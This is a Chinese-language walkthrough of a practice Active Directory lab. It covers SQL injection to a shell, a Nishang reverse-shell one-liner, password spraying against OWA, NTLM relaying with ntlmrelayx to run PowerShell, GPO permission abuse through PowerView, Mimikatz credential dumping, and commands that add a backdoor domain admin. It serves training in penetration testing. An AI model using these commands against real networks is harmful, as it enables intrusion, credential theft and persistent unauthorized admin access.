# lkylabs v1
这是 lkys37en 的 Active Directory 实验平台的第一版writeup。它包含网络枚举，域枚举，中继和 滥用安全控件配置/错误配置。

##### 工具
* Empire
* Powershell
* Responder
* Bloodhound
* Powerview
* Mimikatz
* Sqlmap
* Nmap

## 网络枚举
```powershell
nmap 10.7.12.11 10.7.12.12 10.7.12.13
```
## 获得一个落脚点
sqlmap

在 WEB01 10.7.12.12 中存在一个sql注入可获得一个系统shell。
在 os-shell 中， 使用 oneliner ninshang中 `Invoke-PowerShellTcp.ps1`获得一个shell。

## 获取一个域用户
使用 `net users /domain` 命令获取域用户的列表。

## 可选方案：password spraying
<https://www.youtube.com/watch?v=hBvrC4t2hn8> 获得密码列表。
<https://github.com/asciimoo/exrex>

```powershell
python exrex.py "(Spring|Winter|Autumn|Fall|Summer)(20)1(78)!" > passwords.txt


msfconsole auxiliary/scanner/http/owa_login set pass_file passwords.txt set user_file usernames.txt set domain set rhost 10.7.12.10
```

## 域枚举
Bloodhound Powerview

## 文件共享枚举
```powershell
Powerview net view \fs01 dir \fs01
```    
枚举文件共享，以sqladmin的身份执行 `dir \FS01.lab.local` 找出 \FS01.lab.local\Groupdata。你也可以使用`net view \fs01`。

文件共享中有一个vpn文件，我们可以使用它打开一个通往实验系统内层的L2隧道，其子网为 `10.8.13.0/24`。

## 中继
Responder ntlmrelay CME?

启动responder，捕获可以中继的netntlmv2哈希值。responder会选择两个用户 `responder -I tap0 -wrf`。

列出目标主机，如果你检查两个被列出的用户的权限，他们应该是 `WS05`。

使用 ntlmrelay 来中继哈希值，然后运行 `nishang powershell oneliner.` 使一个listener就绪。

```powershell
ntlmrelayx.py -tf targets.txt -c 'powershell.exe blabla oneliner'
```

当哈希被中继的时候，就会在目标主机上生成一个shel(lab\DPayne)。

## GPO 枚举
powerview

使用 `Get-NetGPOGroup`  枚举其GPO, 可以获得一个叫做 MailServer-Config 的GPO, 这个GPO很有意思。

将这个成员的SID转换成域名。
```Powershell
Convert-SidToName S-1-5-21-1704012399-894155344-4184019992-1154
```

它将解析为 `BUILTIN\Administrators` ，进一步枚举GPO, 包括 MailServer-Config。
```powershell
Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```

将显示 Server Admins 对这个GPO有写权限。

```powershell
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
```
我们可以看到 Server Admins 组对这个GPO有修改权限。现在来基于这个GPO的GUID反过来找到哪些机器应用了这个GPO。
```Powershell
Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}
```
结果只有 `MX01.lab.local` 应用了这个GPO, 咱们使用这个命令来看看这个GPO本身的信息。

```powershell
type "\\lab.local\sysvol\lab.local\Policies\{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"
```
显然这个GPO向MX01的内置管理员组中添加了一个组。然后这个可以被修改为添加Server admins组。

我们使用 `Invoke-GpUpdate -Computer MX01 -Force` 为一台特定的机器打开这个GPO。
 
 一会儿之后，这个GPO应该被推送到MX01， 并且"Server admins"会被授予本地管理员权限。然后就有可能使用WinRM或者其他技巧在这个box上创建一个shell。
 
 ## 获得域管理员
 Mimikatz
 
现在，我们运行mimikatz来获取这个主机的所有凭证。这将获得BDavis的凭证,他是一个高权限的服务管理员，在在这个主机上导入Powerview, 产生一个BDavis的shell, 在BOX01上运行Mimikatz，然后发现另外一个用户和他的明文密码。这个用户是域管理员，所以，再一个shell（ 这里有一个替代方案是使用令牌模拟）。继续将自己添加为域中的用户并将自己添加到域中。
```powershell
net user chryzsh password  /add /domain 
net group“Domain Admins”/add chryzsh /domain 
net group“Remote Desktop Users”/add lab\chryzsh /domain
```